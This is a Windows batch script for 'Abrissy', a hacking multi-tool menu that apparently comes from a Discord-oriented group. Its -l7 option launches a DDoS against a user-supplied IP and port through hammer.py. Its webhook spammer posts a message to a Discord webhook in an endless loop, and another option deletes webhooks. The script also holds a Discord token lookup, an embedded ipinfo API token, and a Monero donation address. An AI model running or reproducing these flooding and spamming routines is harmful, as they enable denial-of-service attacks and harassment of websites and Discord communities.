@echo off
title Abrissy : Made by TorchStudios
chcp 65001 >nul
setlocal enabledelayedexpansion

set "arg=%1"

:switch
if "%arg%"=="" goto :hud
if "%arg%"=="-h" goto :help
if "%arg%"=="-wm" goto :webhookmessenger
if "%arg%"=="-wr" goto :webhookremover
if "%arg%"=="-ws" goto :webhookspammer
if "%arg%"=="-l7" goto :ddoswebsite 
if "%arg%"=="-pw" goto :pingwebsite 
if "%arg%"=="-credits" goto :credits  
if "%arg%"=="-il" goto :iplookup
if "%arg%"=="-ws" goto :wifi-scan
if "%arg%"=="-st" goto :speedtest
if "%arg%"=="-install-req" setup.bat
if "%arg%"=="-pr" goto :proxy
if "%arg%"=="-pd" goto :disconnect-proxy
if "%arg%"=="-tl" goto :tokenlookup

echo 
goto :end
:end
endlocal
:hud 
type log.txt 
echo.
echo [37m[[0m[95mABRISSY[0m[37m][0m [36muse -h to get help in Abrissy[0m
echo [36mor install requirements by using -install-req[0m
goto end 
:help
echo WIFI INTEGRATIONS
echo [35m[[0m[37m-ws[0m[35m][0m [95mScan wifi networks[0m
echo [35m[[0m[37m-l7[0m[35m][0m [95mSend DDoS Attack to website[0m
echo [35m[[0m[37m-pw[0m[35m][0m [95mGet website IP Adress[0m
echo [35m[[0m[37m-il[0m[35m][0m [95mGet informations about IP Adress[0m
echo [35m[[0m[37m-st[0m[35m][0m [95mcheck speedtest[0m
echo [35m[[0m[37m-pr[0m[35m][0m [95mConnect to custom proxy HTTP/HTTPS/SOCKS4/SOCKS5[0m
echo [35m[[0m[37m-pd[0m[35m][0m [95mDisconnect from connected proxy[0m
echo DISCORD INTEGRATIONS 
echo [35m[[0m[37m-tl[0m[35m][0m [95mDiscord Token info (LookUp)[0m
echo [35m[[0m[37m-wm[0m[35m][0m [95mSend Discord webhook message.[0m
echo [35m[[0m[37m-wr[0m[35m][0m [95mRemove Discord webhook.[0m
echo [35m[[0m[37m-ws[0m[35m][0m [95mSpam webhook[0m
echo OTHER
echo [35m[[0m[37m-credits[0m[35m][0m [95mThis command shown informations about tool[0m

goto :end
:webhookspammer 
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mEnter webhook. [0m
set /p "webhook=>[95m"[0m
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mEnter message to spam. [0m
set /p "message=>[95m"[0m
:spam 
curl -H "Content-Type: application/json" -d "{\"content\":\"%message%\"}" %webhook%
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mMessage sent.
timeout 1 >nul
goto spam 
:webhookremover
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mEnter webhook. [0m
set /p "webhook=>[95m"[0m
curl -X DELETE %webhook%
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mWebhook has been removed succesful [0m
goto end 

:webhookmessenger
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mEnter webhook. [0m
set /p "webhook=>[95m"[0m
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mEnter message to send. [0m
set /p "message=>[95m"[0m
curl -H "Content-Type: application/json" -d "{\"content\":\"%message%\"}" %webhook%
echo [37m[[0m[95mABRISSY[0m[37m][0m Message has been sent succesful[0m
goto end 

:ddoswebsite 
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mEnter website IP Adress (you can get website ip adress by using -pw )[0m
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mCtrl + C to stop[0m
set /p "siteip=>[95m"[0m
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mPort: [0m
set /p "siteport=>[95m"[0m
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mAre you sure? (Y/N)[0m
set /p "yn=>[95m"[0m
if %yn%==y goto d 
if %yn%==Y goto d 
if %yn%==n goto end 
if %yn%==N goto end 
:d 
python hammer.py -s %siteip% -t 135 -p %siteport%

:pingwebsite 
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mEnter website domain.[0m
set /p "website=>[95m"[0m
for /f "tokens=2 delims=[]" %%a in ('ping -n 1 %website% ^| findstr /i "Pinging"') do (
    set "ip_address=%%a"
)
if defined ip_address (
    echo [37m[[0m[95mABRISSY[0m[37m][0m [36m%website% = %ip_address%[0m
) else (
    echo [37m[[0m[95mABRISSY[0m[37m][0m [36mCannot get IP from %website%[0m
)
goto end
pause

:iplookup 
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mEnter user IP. [0m
set /p "ip=>[95m"[0m
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mDetecing...[0m
curl ipinfo.io/%ip%?token=7ac6b2bcbf4dae
goto end 

:proxy 
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mWARNING: Command prompt must be launched as administrator to use [0m
echo [36mcustom proxy [0m
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mEnter Adress+Port [0m
set /p "prox=>[95m"[0m
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "%prox%" /f 
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mConnected to %prox%[0m
goto end 

:disconnect-proxy 
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "" /f 
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyDisable /t REG_DWORD /d 1 /f
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mDisconnected[0m
goto end 

:speedtest 
st.cmd
:wifi-scan
netsh wlan show networks mode=bssid
goto end
:credits 
echo [36mThis tool was made by dc: abrissy[0m
echo [95mMONERO[0m: [36m48z3avaJH374ckT9YxogPm4Q5nDvhz8oxE8nuuuXtJTU88sbyhKuMJqema5i9bd5HM5fN3ruP2Ch5QgjsGyv7CQp3KEHpaH[0m
echo [95mDISCORD[0m: [36mhttps://discord.gg/eWjJdFVf[0m
echo [95mHall Of Autism[0m: [36mhttps://torch-studios.github.io/hoa/HOA.html[0m
goto end 
:tokenlookup
cd tL 
echo [37m[[0m[95mABRISSY[0m[37m][0m [36mLaunching Abrissy Token Lookup[0m
timeout 1 >nul
start tl.html 
cd..
goto end 
:end
endlocal

